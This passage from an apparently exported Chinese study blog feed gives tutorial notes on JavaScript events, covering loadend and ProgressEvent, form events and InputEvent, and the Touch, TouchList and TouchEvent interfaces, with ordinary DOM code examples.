<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;/wrong/url&quot;</span> onerror=<span class="string">&quot;this.style.display=&#x27;none&#x27;;&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
<p><code>loadend</code>事件的监听函数，可以用来取代<code>abort</code>事件、<code>load</code>事件、<code>error</code>事件的监听函数，因为它总是在这些事件之后发生。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.addEventListener(<span class="string">&#x27;loadend&#x27;</span>, loadEnd, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadEnd</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;传输结束，成功失败未知&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>loadend事件本身不提供关于进度结束的原因，但可以用它来做所有加载结束场景都需要做的一些操作。</p>
<p>另外，<code>error</code>事件有一个特殊的性质，就是不会冒泡。所以，子元素的<code>error</code>事件，不会触发父元素的<code>error</code>事件监听函数。</p>
<h4 id="6-2-ProgressEvent-接口"><a href="#6-2-ProgressEvent-接口" class="headerlink" title="6.2 ProgressEvent 接口"></a>6.2 ProgressEvent 接口</h4><p><code>ProgressEvent</code>接口主要用来描述外部资源加载的进度，比如 AJAX 加载、<code>&lt;img&gt;</code>、<code>&lt;video&gt;</code>、<code>&lt;style&gt;</code>、<code>&lt;link&gt;</code>等外部资源加载。进度相关的事件都继承了这个接口。</p>
<p>浏览器原生提供了<code>ProgressEvent()</code>构造函数，用来生成事件实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> ProgressEvent(type, options)</span><br></pre></td></tr></table></figure>
<p><code>ProgressEvent()</code>构造函数接受两个参数。第一个参数是字符串，表示事件的类型，这个参数是必须的。第二个参数是一个配置对象，表示事件的属性，该参数可选。配置对象除了可以使用<code>Event</code>接口的配置属性，还可以使用下面的属性，所有这些属性都是可选的。</p>
<ul>
<li><code>lengthComputable</code>：布尔值，表示加载的总量是否可以计算，默认是<code>false</code>。</li>
<li><code>loaded</code>：整数，表示已经加载的量，默认是<code>0</code>。</li>
<li><code>total</code>：整数，表示需要加载的总量，默认是<code>0</code>。</li>
</ul>
<p><code>ProgressEvent</code>具有对应的实例属性。</p>
<ul>
<li><code>ProgressEvent.lengthComputable</code></li>
<li><code>ProgressEvent.loaded</code></li>
<li><code>ProgressEvent.total</code></li>
</ul>
<p>如果<code>ProgressEvent.lengthComputable</code>为<code>false</code>，<code>ProgressEvent.total</code>实际上是没有意义的。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> ProgressEvent(<span class="string">&#x27;load&#x27;</span>, &#123;</span><br><span class="line">  lengthComputable: <span class="literal">true</span>,</span><br><span class="line">  loaded: <span class="number">30</span>,</span><br><span class="line">  total: <span class="number">100</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">&#x27;load&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;已经加载：&#x27;</span> + (e.loaded / e.total) * <span class="number">100</span> + <span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.dispatchEvent(p);</span><br><span class="line"><span class="comment">// 已经加载：30%</span></span><br></pre></td></tr></table></figure>
<p>上面代码先构造一个<code>load</code>事件，抛出后被监听函数捕捉到。</p>
<p>下面是一个实际的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.addEventListener(<span class="string">&#x27;progress&#x27;</span>, updateProgress, <span class="literal">false</span>);</span><br><span class="line">xhr.addEventListener(<span class="string">&#x27;load&#x27;</span>, transferComplete, <span class="literal">false</span>);</span><br><span class="line">xhr.addEventListener(<span class="string">&#x27;error&#x27;</span>, transferFailed, <span class="literal">false</span>);</span><br><span class="line">xhr.addEventListener(<span class="string">&#x27;abort&#x27;</span>, transferCanceled, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">xhr.open();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateProgress</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e.lengthComputable) &#123;</span><br><span class="line">    <span class="keyword">var</span> percentComplete = e.loaded / e.total;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;不能计算进度&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferComplete</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;传输结束&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferFailed</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;传输过程中发生错误&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferCanceled</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;用户取消了传输&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面是下载过程的进度事件，还存在上传过程的进度事件。这时所有监听函数都要放在<code>XMLHttpRequest.upload</code>对象上面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.upload.addEventListener(<span class="string">&#x27;progress&#x27;</span>, updateProgress, <span class="literal">false</span>);</span><br><span class="line">xhr.upload.addEventListener(<span class="string">&#x27;load&#x27;</span>, transferComplete, <span class="literal">false</span>);</span><br><span class="line">xhr.upload.addEventListener(<span class="string">&#x27;error&#x27;</span>, transferFailed, <span class="literal">false</span>);</span><br><span class="line">xhr.upload.addEventListener(<span class="string">&#x27;abort&#x27;</span>, transferCanceled, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">xhr.open();</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-进度事件</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0050</title>
    <url>/2021/05/29/%E6%89%93%E5%8D%A10050/</url>
    <content><![CDATA[<p><font color=#817936>每个人都在自己的生命中频繁地抛弃着自己的过去。</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="7-表单事件"><a href="#7-表单事件" class="headerlink" title="7. 表单事件"></a>7. 表单事件</h3><h4 id="7-1-表单事件的种类"><a href="#7-1-表单事件的种类" class="headerlink" title="7.1 表单事件的种类"></a>7.1 表单事件的种类</h4><h5 id="7-1-1-input-事件"><a href="#7-1-1-input-事件" class="headerlink" title="7.1.1 input 事件"></a>7.1.1 input 事件</h5><p><code>input</code>事件当<code>&lt;input&gt;</code>、<code>&lt;select&gt;</code>、<code>&lt;textarea&gt;</code>的值发生变化时触发。对于复选框（<code>&lt;input type=checkbox&gt;</code>）或单选框（<code>&lt;input type=radio&gt;</code>），用户改变选项时，也会触发这个事件。另外，对于打开<code>contenteditable</code>属性的元素，只要值发生变化，也会触发<code>input</code>事件。</p>
<p><code>input</code>事件的一个特点，就是会连续触发，比如用户每按下一次按键，就会触发一次<code>input</code>事件。</p>
<p><code>input</code>事件对象继承了<code>InputEvent</code>接口。</p>
<p>该事件跟<code>change</code>事件很像，不同之处在于<code>input</code>事件在元素的值发生变化后立即发生，而<code>change</code>在元素失去焦点时发生，而内容此时可能已经变化多次。也就是说，如果有连续变化，<code>input</code>事件会触发多次，而<code>change</code>事件只在失去焦点时触发一次。</p>
<span id="more"></span>
<p>下面是<code>&lt;select&gt;</code>元素的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">&lt;select id=&quot;mySelect&quot;&gt;</span></span><br><span class="line"><span class="comment">  &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;</span></span><br><span class="line"><span class="comment">  &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;</span></span><br><span class="line"><span class="comment">  &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;</span></span><br><span class="line"><span class="comment">&lt;/select&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inputHandler</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.target.value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mySelect = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#mySelect&#x27;</span>);</span><br><span class="line">mySelect.addEventListener(<span class="string">&#x27;input&#x27;</span>, inputHandler);</span><br></pre></td></tr></table></figure>
<p>上面代码中，改变下拉框选项时，会触发<code>input</code>事件，从而执行回调函数<code>inputHandler</code>。</p>
<h5 id="7-1-2-select-事件"><a href="#7-1-2-select-事件" class="headerlink" title="7.1.2 select 事件"></a>7.1.2 select 事件</h5><p><code>select</code>事件当在<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>里面选中文本时触发。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input id=&quot;test&quot; type=&quot;text&quot; value=&quot;Select me!&quot; /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">elem.addEventListener(<span class="string">&#x27;select&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.type); <span class="comment">// &quot;select&quot;</span></span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>选中的文本可以通过<code>event.target</code>元素的<code>selectionDirection</code>、<code>selectionEnd</code>、<code>selectionStart</code>和<code>value</code>属性拿到。</p>
<h5 id="7-1-3-change-事件"><a href="#7-1-3-change-事件" class="headerlink" title="7.1.3 change 事件"></a>7.1.3 change 事件</h5><p><code>change</code>事件当<code>&lt;input&gt;</code>、<code>&lt;select&gt;</code>、<code>&lt;textarea&gt;</code>的值发生变化时触发。它与<code>input</code>事件的最大不同，就是不会连续触发，只有当全部修改完成时才会触发，另一方面<code>input</code>事件必然伴随<code>change</code>事件。具体来说，分成以下几种情况。</p>
<ul>
<li>激活单选框（radio）或复选框（checkbox）时触发。</li>
<li>用户提交时触发。比如，从下列列表（select）完成选择，在日期或文件输入框完成选择。</li>
<li>当文本框或<code>&lt;textarea&gt;</code>元素的值发生改变，并且丧失焦点时触发。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;select size=&quot;1&quot; onchange=&quot;changeEventHandler(event);&quot;&gt;</span></span><br><span class="line"><span class="comment">//   &lt;option&gt;chocolate&lt;/option&gt;</span></span><br><span class="line"><span class="comment">//   &lt;option&gt;strawberry&lt;/option&gt;</span></span><br><span class="line"><span class="comment">//   &lt;option&gt;vanilla&lt;/option&gt;</span></span><br><span class="line"><span class="comment">// &lt;/select&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeEventHandler</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(event.target.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果比较一下上面<code>input</code>事件的例子，你会发现对于<code>&lt;select&gt;</code>元素来说，<code>input</code>和<code>change</code>事件基本是等价的。</p>
<h5 id="7-1-4-invalid-事件"><a href="#7-1-4-invalid-事件" class="headerlink" title="7.1.4 invalid 事件"></a>7.1.4 invalid 事件</h5><p>用户提交表单时，如果表单元素的值不满足校验条件，就会触发<code>invalid</code>事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;text&quot;</span> required oninvalid=<span class="string">&quot;console.log(&#x27;invalid input&#x27;)&quot;</span> /&gt;</span><br><span class="line">  &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，输入框是必填的。如果不填，用户点击按钮提交时，就会触发输入框的<code>invalid</code>事件，导致提交被取消。</p>
<h5 id="7-1-5-reset-事件，submit-事件"><a href="#7-1-5-reset-事件，submit-事件" class="headerlink" title="7.1.5 reset 事件，submit 事件"></a>7.1.5 reset 事件，submit 事件</h5><p>这两个事件发生在表单对象<code>&lt;form&gt;</code>上，而不是发生在表单的成员上。</p>
<p><code>reset</code>事件当表单重置（所有表单成员变回默认值）时触发。</p>
<p><code>submit</code>事件当表单数据向服务器提交时触发。注意，<code>submit</code>事件的发生对象是<code>&lt;form&gt;</code>元素，而不是<code>&lt;button&gt;</code>元素，因为提交的是表单，而不是按钮。</p>
<h4 id="7-2-InputEvent-接口"><a href="#7-2-InputEvent-接口" class="headerlink" title="7.2 InputEvent 接口"></a>7.2 InputEvent 接口</h4><p><code>InputEvent</code>接口主要用来描述<code>input</code>事件的实例。该接口继承了<code>Event</code>接口，还定义了一些自己的实例属性和实例方法。</p>
<p>浏览器原生提供<code>InputEvent()</code>构造函数，用来生成实例对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> InputEvent(type, options)</span><br></pre></td></tr></table></figure>
<p><code>InputEvent</code>构造函数可以接受两个参数。第一个参数是字符串，表示事件名称，该参数是必需的。第二个参数是一个配置对象，用来设置事件实例的属性，该参数是可选的。配置对象的字段除了<code>Event</code>构造函数的配置属性，还可以设置下面的字段，这些字段都是可选的。</p>
<ul>
<li><code>inputType</code>：字符串，表示发生变更的类型（详见下文）。</li>
<li><code>data</code>：字符串，表示插入的字符串。如果没有插入的字符串（比如删除操作），则返回<code>null</code>或空字符串。</li>
<li><code>dataTransfer</code>：返回一个 DataTransfer 对象实例，该属性通常只在输入框接受富文本输入时有效。</li>
</ul>
<p><code>InputEvent</code>的实例属性主要就是上面三个属性，这三个实例属性都是只读的。</p>
<h5 id="1-InputEvent-data"><a href="#1-InputEvent-data" class="headerlink" title="(1)InputEvent.data"></a>(1)InputEvent.data</h5><p><code>InputEvent.data</code>属性返回一个字符串，表示变动的内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;text&quot; id=&quot;myInput&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myInput&#x27;</span>);</span><br><span class="line">input.addEventListener(<span class="string">&#x27;input&#x27;</span>, myFunction, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，如果手动在输入框里面输入<code>abc</code>，控制台会先输出<code>a</code>，再在下一行输出<code>b</code>，再在下一行输出<code>c</code>。然后选中<code>abc</code>，一次性将它们删除，控制台会输出<code>null</code>或一个空字符串。</p>
<h5 id="（2）InputEvent-inputType"><a href="#（2）InputEvent-inputType" class="headerlink" title="（2）InputEvent.inputType"></a>（2）InputEvent.inputType</h5><p><code>InputEvent.inputType</code>属性返回一个字符串，表示字符串发生变更的类型。</p>
<p>对于常见情况，Chrome 浏览器的返回值如下。完整列表可以参考文档。</p>
<ul>
<li>手动插入文本：<code>insertText</code></li>
<li>粘贴插入文本：<code>insertFromPaste</code></li>
<li>向后删除：<code>deleteContentBackward</code></li>
<li>向前删除：<code>deleteContentForward</code></li>
</ul>
<h5 id="（3）InputEvent-dataTransfer"><a href="#（3）InputEvent-dataTransfer" class="headerlink" title="（3）InputEvent.dataTransfer"></a>（3）InputEvent.dataTransfer</h5><p><code>InputEvent.dataTransfer</code>属性返回一个 DataTransfer 实例。该属性只在文本框接受粘贴内容（<code>insertFromPaste</code>）或拖拽内容（<code>insertFromDrop</code>）时才有效。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-表单事件</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0051</title>
    <url>/2021/05/29/%E6%89%93%E5%8D%A10051/</url>
    <content><![CDATA[<p><font color=#444693>今夜不知何处宿，平沙万里绝人烟。</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="8-触摸事件"><a href="#8-触摸事件" class="headerlink" title="8. 触摸事件"></a>8. 触摸事件</h3><h4 id="8-1-触摸操作概述"><a href="#8-1-触摸操作概述" class="headerlink" title="8.1 触摸操作概述"></a>8.1 触摸操作概述</h4><p>浏览器的触摸 API 由三个部分组成。</p>
<ul>
<li>Touch：一个触摸点</li>
<li>TouchList：多个触摸点的集合</li>
<li>TouchEvent：触摸引发的事件实例</li>
</ul>
<p><code>Touch</code>接口的实例对象用来表示触摸点（一根手指或者一根触摸笔），包括位置、大小、形状、压力、目标元素等属性。有时，触摸动作由多个触摸点（多根手指）组成，多个触摸点的集合由<code>TouchList</code>接口的实例对象表示。<code>TouchEvent</code>接口的实例对象代表由触摸引发的事件，只有触摸屏才会引发这一类事件。</p>
<p>很多时候，触摸事件和鼠标事件同时触发，即使这个时候并没有用到鼠标。这是为了让那些只定义鼠标事件、没有定义触摸事件的代码，在触摸屏的情况下仍然能用。如果想避免这种情况，可以用<code>event.preventDefault</code>方法阻止发出鼠标事件。</p>
<span id="more"></span>
<h4 id="8-2-Touch-接口"><a href="#8-2-Touch-接口" class="headerlink" title="8.2 Touch 接口"></a>8.2 Touch 接口</h4><h5 id="8-2-1-Touch-接口概述"><a href="#8-2-1-Touch-接口概述" class="headerlink" title="8.2.1 Touch 接口概述"></a>8.2.1 Touch 接口概述</h5><p>Touch 接口代表单个触摸点。触摸点可能是一根手指，也可能是一根触摸笔。</p>
<p>浏览器原生提供<code>Touch</code>构造函数，用来生成<code>Touch</code>实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> touch = <span class="keyword">new</span> Touch(touchOptions);</span><br></pre></td></tr></table></figure>
<p><code>Touch</code>构造函数接受一个配置对象作为参数，它有以下属性。</p>
<ul>
<li><code>identifier</code>：必需，类型为整数，表示触摸点的唯一 ID。</li>
<li><code>target</code>：必需，类型为元素节点，表示触摸点开始时所在的网页元素。</li>
<li><code>clientX</code>：可选，类型为数值，表示触摸点相对于浏览器窗口左上角的水平距离，默认为0。</li>
<li><code>clientY</code>：可选，类型为数值，表示触摸点相对于浏览器窗口左上角的垂直距离，默认为0。</li>
<li><code>screenX</code>：可选，类型为数值，表示触摸点相对于屏幕左上角的水平距离，默认为0。</li>
<li><code>screenY</code>：可选，类型为数值，表示触摸点相对于屏幕左上角的垂直距离，默认为0。</li>
<li><code>pageX</code>：可选，类型为数值，表示触摸点相对于网页左上角的水平位置（即包括页面的滚动距离），默认为0。</li>
<li><code>pageY</code>：可选，类型为数值，表示触摸点相对于网页左上角的垂直位置（即包括页面的滚动距离），默认为0。</li>
<li><code>radiusX</code>：可选，类型为数值，表示触摸点周围受到影响的椭圆范围的 X 轴半径，默认为0。</li>
<li><code>radiusY</code>：可选：类型为数值，表示触摸点周围受到影响的椭圆范围的 Y 轴半径，默认为0。</li>
<li><code>rotationAngle</code>：可选，类型为数值，表示触摸区域的椭圆的旋转角度，单位为度数，在0到90度之间，默认值为0。</li>
<li><code>force</code>：可选，类型为数值，范围在<code>0</code>到<code>1</code>之间，表示触摸压力。<code>0</code>代表没有压力，<code>1</code>代表硬件所能识别的最大压力，默认为<code>0</code>。</li>
</ul>
<h5 id="8-2-2-Touch-接口的实例属性"><a href="#8-2-2-Touch-接口的实例属性" class="headerlink" title="8.2.2 Touch 接口的实例属性"></a>8.2.2 Touch 接口的实例属性</h5><h6 id="（1）Touch-identifier"><a href="#（1）Touch-identifier" class="headerlink" title="（1）Touch.identifier"></a>（1）Touch.identifier</h6><p><code>Touch.identifier</code>属性返回一个整数，表示触摸点的唯一 ID。这个值在整个触摸过程保持不变，直到触摸事件结束。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">someElement.addEventListener(<span class="string">&#x27;touchmove&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.changedTouches.length; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.changedTouches[i].identifier);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<h6 id="（2）Touch-screenX，Touch-screenY，Touch-clientX，Touch-clientY，pageX，pageY"><a href="#（2）Touch-screenX，Touch-screenY，Touch-clientX，Touch-clientY，pageX，pageY" class="headerlink" title="（2）Touch.screenX，Touch.screenY，Touch.clientX，Touch.clientY，pageX，pageY"></a>（2）Touch.screenX，Touch.screenY，Touch.clientX，Touch.clientY，pageX，pageY</h6><p><code>Touch.screenX</code>属性和<code>Touch.screenY</code>属性，分别表示触摸点相对于屏幕左上角的横坐标和纵坐标，与页面是否滚动无关。</p>
<p><code>Touch.clientX</code>属性和<code>Touch.clientY</code>属性，分别表示触摸点相对于浏览器视口左上角的横坐标和纵坐标，与页面是否滚动无关。</p>
<p><code>Touch.pageX</code>属性和<code>Touch.pageY</code>属性，分别表示触摸点相对于当前页面左上角的横坐标和纵坐标，包含了页面滚动带来的位移。</p>
<h6 id="（3）Touch-radiusX，Touch-radiusY，Touch-rotationAngle"><a href="#（3）Touch-radiusX，Touch-radiusY，Touch-rotationAngle" class="headerlink" title="（3）Touch.radiusX，Touch.radiusY，Touch.rotationAngle"></a>（3）Touch.radiusX，Touch.radiusY，Touch.rotationAngle</h6><p><code>Touch.radiusX</code>属性和<code>Touch.radiusY</code>属性，分别返回触摸点周围受到影响的椭圆范围的 X 轴半径和 Y 轴半径，单位为像素。乘以 2 就可以得到触摸范围的宽度和高度。</p>
<p><code>Touch.rotationAngle</code>属性表示触摸区域的椭圆的旋转角度，单位为度数，在<code>0</code>到<code>90</code>度之间。</p>
<p>上面这三个属性共同定义了用户与屏幕接触的区域，对于描述手指这一类非精确的触摸，很有帮助。指尖接触屏幕，触摸范围会形成一个椭圆，这三个属性就用来描述这个椭圆区域。</p>
<p>下面是一个示例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.addEventListener(<span class="string">&#x27;touchstart&#x27;</span>, rotate);</span><br><span class="line">div.addEventListener(<span class="string">&#x27;touchmove&#x27;</span>, rotate);</span><br><span class="line">div.addEventListener(<span class="string">&#x27;touchend&#x27;</span>, rotate);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rotate</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> touch = e.changedTouches.item(<span class="number">0</span>);</span><br><span class="line">  e.preventDefault();</span><br><span class="line"></span><br><span class="line">  src.style.width = touch.radiusX * <span class="number">2</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">  src.style.height = touch.radiusY * <span class="number">2</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">  src.style.transform = <span class="string">&#x27;rotate(&#x27;</span> + touch.rotationAngle + <span class="string">&#x27;deg)&#x27;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="（4）Touch-force"><a href="#（4）Touch-force" class="headerlink" title="（4）Touch.force"></a>（4）Touch.force</h6><p><code>Touch.force</code>属性返回一个<code>0</code>到<code>1</code>之间的数值，表示触摸压力。<code>0</code>代表没有压力，<code>1</code>代表硬件所能识别的最大压力。</p>
<h6 id="（5）Touch-target"><a href="#（5）Touch-target" class="headerlink" title="（5）Touch.target"></a>（5）Touch.target</h6><p><code>Touch.target</code>属性返回一个元素节点，代表触摸发生时所在的那个元素节点。即使触摸点已经离开了这个节点，该属性依然不变。</p>
<h4 id="8-3-TouchList-接口"><a href="#8-3-TouchList-接口" class="headerlink" title="8.3 TouchList 接口"></a>8.3 TouchList 接口</h4><p><code>TouchList</code>接口表示一组触摸点的集合。它的实例是一个类似数组的对象，成员是<code>Touch</code>的实例对象，表示所有触摸点。用户用三根手指触摸，产生的<code>TouchList</code>实例就会包含三个成员，每根手指的触摸点对应一个<code>Touch</code>实例对象。</p>
<p>它的实例主要通过触摸事件的<code>TouchEvent.touches</code>、<code>TouchEvent.changedTouches</code>、<code>TouchEvent.targetTouches</code>这几个属性获取。</p>
<p>它的实例属性和实例方法只有两个。</p>
<ul>
<li><code>TouchList.length</code>：数值，表示成员数量（即触摸点的数量）。</li>
<li><code>TouchList.item()</code>：返回指定位置的成员，它的参数是该成员的位置编号（从零开始）。</li>
</ul>
<h4 id="8-4-TouchEvent-接口"><a href="#8-4-TouchEvent-接口" class="headerlink" title="8.4 TouchEvent 接口"></a>8.4 TouchEvent 接口</h4><h5 id="8-4-1-概述"><a href="#8-4-1-概述" class="headerlink" title="8.4.1 概述"></a>8.4.1 概述</h5><p>TouchEvent 接口继承了 Event 接口，表示由触摸引发的事件实例，通常来自触摸屏或轨迹板。除了被继承的属性以外，它还有一些自己的属性。</p>
<p>浏览器原生提供<code>TouchEvent()</code>构造函数，用来生成触摸事件的实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> TouchEvent(type, options)</span><br></pre></td></tr></table></figure>
<p><code>TouchEvent()</code>构造函数可以接受两个参数，第一个参数是字符串，表示事件类型；第二个参数是事件的配置对象，该参数是可选的，对象的所有属性也是可选的。除了Event接口的配置属性，该接口还有一些自己的配置属性。</p>
<ul>
<li><code>touches</code>：<code>TouchList</code>实例，代表所有的当前处于活跃状态的触摸点，默认值是一个空数组<code>[]</code>。</li>
<li><code>targetTouches</code>：<code>TouchList</code>实例，代表所有处在触摸的目标元素节点内部、且仍然处于活动状态的触摸点，默认值是一个空数组<code>[]</code>。</li>
<li><code>changedTouches</code>：<code>TouchList</code>实例，代表本次触摸事件的相关触摸点，默认值是一个空数组<code>[]</code>。</li>
<li><code>ctrlKey</code>：布尔值，表示 Ctrl 键是否同时按下，默认值为<code>false</code>。</li>
<li><code>shiftKey</code>：布尔值，表示 Shift 键是否同时按下，默认值为<code>false</code>。</li>
<li><code>altKey</code>：布尔值，表示 Alt 键是否同时按下，默认值为<code>false</code>。</li>
<li><code>metaKey</code>：布尔值，表示 Meta 键（或 Windows 键）是否同时按下，默认值为<code>false</code>。</li>
</ul>
<h5 id="8-4-2-实例属性"><a href="#8-4-2-实例属性" class="headerlink" title="8.4.2 实例属性"></a>8.4.2 实例属性</h5><p>TouchEvent 接口的实例具有<code>Event</code>实例的所有属性和方法，此外还有一些它自己的实例属性，这些属性全部都是只读。</p>
<h6 id="（1）TouchEvent-altKey，TouchEvent-ctrlKey，TouchEvent-shiftKey，TouchEvent-metaKey"><a href="#（1）TouchEvent-altKey，TouchEvent-ctrlKey，TouchEvent-shiftKey，TouchEvent-metaKey" class="headerlink" title="（1）TouchEvent.altKey，TouchEvent.ctrlKey，TouchEvent.shiftKey，TouchEvent.metaKey"></a>（1）TouchEvent.altKey，TouchEvent.ctrlKey，TouchEvent.shiftKey，TouchEvent.metaKey</h6><ul>
<li><code>TouchEvent.altKey</code>：布尔值，表示触摸时是否按下了 Alt 键。</li>
<li><code>TouchEvent.ctrlKey</code>：布尔值，表示触摸时是否按下了 Ctrl 键。</li>
<li><code>TouchEvent.shiftKey</code>：布尔值：表示触摸时是否按下了 Shift 键。</li>
<li><code>TouchEvent.metaKey</code>：布尔值，表示触摸时是否按下了 Meta 键（或 Windows 键）。</li>
</ul>
<p>下面是一个示例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">someElement.addEventListener(<span class="string">&#x27;touchstart&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;altKey = &#x27;</span> + e.altKey);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;ctrlKey = &#x27;</span> + e.ctrlKey);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;metaKey = &#x27;</span> + e.metaKey);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;shiftKey = &#x27;</span> + e.shiftKey);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
